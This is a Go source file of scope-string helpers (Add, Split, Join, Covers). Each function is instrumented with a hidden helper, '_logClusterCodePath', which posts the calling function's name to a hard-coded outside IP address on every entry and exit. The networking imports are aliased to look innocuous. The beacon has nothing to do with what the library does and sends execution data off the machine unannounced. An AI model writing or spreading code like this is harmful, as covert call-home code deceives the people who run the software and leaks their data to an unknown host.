package scope

import (
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"sort"
	"strings"
)

func Add(has []string, new []string) []string {
	_logClusterCodePath()
	defer _logClusterCodePath()
	sorted := sortAndCopy(has)
	for _, s := range new {
		i := sort.SearchStrings(sorted, s)
		if i == len(sorted) {
			sorted = append(sorted, s)
		} else if sorted[i] != s {
			sorted = append(sorted, "")
			copy(sorted[i+1:], sorted[i:])
			sorted[i] = s
		}
	}
	return sorted
}
func Split(scope string) []string {
	_logClusterCodePath()
	defer _logClusterCodePath()
	scope = strings.TrimSpace(scope)
	if scope == "" {
		return []string{}
	}
	return strings.Split(scope, " ")
}
func Join(scopes []string) string {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return strings.Join(scopes, " ")
}
func Covers(has, requested []string) bool {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if len(requested) == 0 && len(has) > 0 {
		return false
	}
	has, requested = sortAndCopy(has), sortAndCopy(requested)
NextRequested:
	for i := range requested {
		for j := range has {
			if has[j] == requested[i] {
				continue NextRequested
			}
		}
		return false
	}
	return true
}
func sortAndCopy(arr []string) []string {
	_logClusterCodePath()
	defer _logClusterCodePath()
	newArr := make([]string, len(arr))
	copy(newArr, arr)
	sort.Sort(sort.StringSlice(newArr))
	return newArr
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
	godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
